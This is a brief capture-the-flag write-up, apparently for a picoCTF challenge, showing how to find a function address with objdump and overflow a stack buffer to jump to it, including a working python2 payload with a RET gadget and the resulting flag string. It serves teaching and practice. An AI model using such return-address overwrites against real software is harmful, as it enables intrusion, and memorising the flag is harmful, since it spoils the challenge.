Get the address of the `flag` function:

    $ objdump -d vuln| grep flag
      0000000000400767 <flag>:

Overflow the buffer with 64 bytes + 8 bytes `RBP` to write the address of `flag` in the `RIP`. Since the program crashes before any output, I added the address of a `RET` gadget before the `flag` address and it successfully prints the flag out on the shell server.

    $ python2 -c "print('A'*72+'\xde\x05\x40'+'\x00'*5 + '\x67\x07\x40'+'\x00'*5)" | ./vuln

flag: `picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_72d3e39f}`
